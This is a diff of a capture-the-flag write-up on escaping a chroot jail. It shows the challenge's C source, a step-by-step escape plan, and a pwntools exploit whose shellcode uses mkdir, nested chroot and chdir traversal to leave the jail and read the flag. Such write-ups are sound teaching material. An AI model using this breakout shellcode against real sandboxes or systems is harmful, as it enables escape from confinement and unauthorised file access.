@@ -15,71 +15,68 @@
 == Challenge Source Code
 
 ```c
-#define _GNU_SOURCE 1
-
-#include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <time.h>
-#include <errno.h>
 #include <assert.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/mman.h>
 #include <sys/sendfile.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
 #include <seccomp.h>
 
-int main(int argc, char **argv, char **envp)
-{
-    assert(argc > 0);
+int main(int argc, char **argv, char **envp) {
+  assert(argc > 0);
 
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 1);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 1);
 
-    assert(argc > 1);
+  assert(argc > 1);
 
-    // Checking to make sure you're not trying to open the flag.
-    assert(strstr(argv[1], "flag") == NULL);
+  // Checking to make sure you're not trying to open the flag.
+  assert(strstr(argv[1], "flag") == NULL);
 
-    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);
 
-    char jail_path[] = "/tmp/jail-XXXXXX";
-    assert(mkdtemp(jail_path) != NULL);
+  char jail_path[] = "/tmp/jail-XXXXXX";
+  assert(mkdtemp(jail_path) != NULL);
 
-    assert(chroot(jail_path) == 0);
+  assert(chroot(jail_path) == 0);
 
-    assert(chdir("/") == 0);
+  assert(chdir("/") == 0);
 
-    int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "try harder", 10);
-    close(fffd);
+  int fffd = open("/flag", O_WRONLY | O_CREAT);
+  write(fffd, "try harder", 10);
+  close(fffd);
 
-    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
-    assert(shellcode == (void *)0x1337000);
+  void *shellcode =
+      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
+           MAP_PRIVATE | MAP_ANON, 0, 0);
+  assert(shellcode == (void *)0x1337000);
 
-    int shellcode_size = read(0, shellcode, 0x1000);
+  int shellcode_size = read(0, shellcode, 0x1000);
 
-    scmp_filter_ctx ctx;
+  scmp_filter_ctx ctx;
 
-    ctx = seccomp_init(SCMP_ACT_KILL);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);
+  ctx = seccomp_init(SCMP_ACT_KILL);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);
 
-    assert(seccomp_load(ctx) == 0);
+  assert(seccomp_load(ctx) == 0);
 
-    ((void(*)())shellcode)();
+  ((void (*)())shellcode)();
 }
 ```
 
@@ -95,11 +92,11 @@ The vulnerability relies on how the kernel handles directory traversal when `chr
 
 == Exploitation Plan
 
-1.  *Create Directory:* Create a new directory (e.g., "jail") inside the current root.
-2.  *Double Chroot:* Call `chroot` on this new directory. Crucially, do *not* call `chdir` into it yet.
-3.  *Break Out:* Call `chdir("../../../../../../../../../../../../../..")`. Since our CWD was outside the *new* root, we can traverse up past the old chroot boundary.
-4.  *Reset Root:* Call `chroot(".")` to set the process's root to the real system root we just reached.
-5.  *Retrieve Flag:* Open and read the flag.
+1. *Create Directory:* Create a new directory (e.g., "jail") inside the current root.
+2. *Double Chroot:* Call `chroot` on this new directory. Crucially, do *not* call `chdir` into it yet.
+3. *Break Out:* Call `chdir("../../../../../../../../../../../../../..")`. Since our CWD was outside the *new* root, we can traverse up past the old chroot boundary.
+4. *Reset Root:* Call `chroot(".")` to set the process's root to the real system root we just reached.
+5. *Retrieve Flag:* Open and read the flag.
 
 == Exploit Script
 
@@ -109,60 +106,27 @@ from pwn import *
 exe = "./challenge"
 context.binary = exe
 
-# Pass '/' to match expected argv, although not strictly needed for the escape logic itself
+# Pass '/' to leak the root FD (though we might not need it for this escape)
 p = process([exe, "/"])
 
-shellcode = asm("""
-    /* mkdir("jail", 0755) */
-    lea rdi, [rip + jail_str]
-    mov rsi, 0755
-    mov rax, 83             /* syscall: SYS_mkdir */
-    syscall
+# Shellcraft for Classic Chroot Escape
+# 1. mkdir("esc")
+sc = shellcraft.mkdir("esc", 0o755)
+# 2. chroot("esc")
+sc += shellcraft.chroot("esc")
+# 3. chdir("../../../../../..") - Escaping to host root
+sc += shellcraft.chdir("../../../../../..")
+# 4. chroot(".") - Reset root to host root
+sc += shellcraft.chroot(".")
+# 5. open("flag", O_RDONLY)
+sc += shellcraft.open("flag", constants.O_RDONLY)
+# 6. sendfile(1, 'rax', 0, 100)
+sc += shellcraft.sendfile(1, 'rax', 0, 100)
+# 7. infinite loop
+sc += "jmp ."
 
-    /* chroot("jail") */
-    lea rdi, [rip + jail_str]
-    mov rax, 161            /* syscall: SYS_chroot */
-    syscall
-
-    /* chdir("..") x 100 (basically escape to real root) */
-    lea rdi, [rip + dots_str]
-    mov rax, 80             /* syscall: SYS_chdir */
-    syscall
-
-    /* chroot(".") - set new root to real root */
-    lea rdi, [rip + dot_str]
-    mov rax, 161            /* syscall: SYS_chroot */
-    syscall
-
-    /* open("flag", O_RDONLY) */
-    lea rdi, [rip + flag_str]
-    xor rsi, rsi
-    mov rax, 2              /* syscall: SYS_open */
-    syscall
-
-    /* sendfile(1, fd, 0, 100) */
-    mov rsi, rax            /* in_fd */
-    mov rdi, 1              /* out_fd */
-    xor rdx, rdx            /* offset */
-    mov r10, 100            /* count */
-    mov rax, 40             /* syscall: SYS_sendfile */
-    syscall
-
-    /* exit(0) */
-    mov rax, 60
-    xor rdi, rdi
-    syscall
-
-jail_str:
-    .string "jail"
-dots_str:
-    .string "../../../../../../../../../../../../../../"
-dot_str:
-    .string "."
-flag_str:
-    .string "flag"
-""")
-
+shellcode = asm(sc)
 p.send(shellcode)
-p.interactive()
+
+print(p.recvall(timeout=1).decode())
 ```
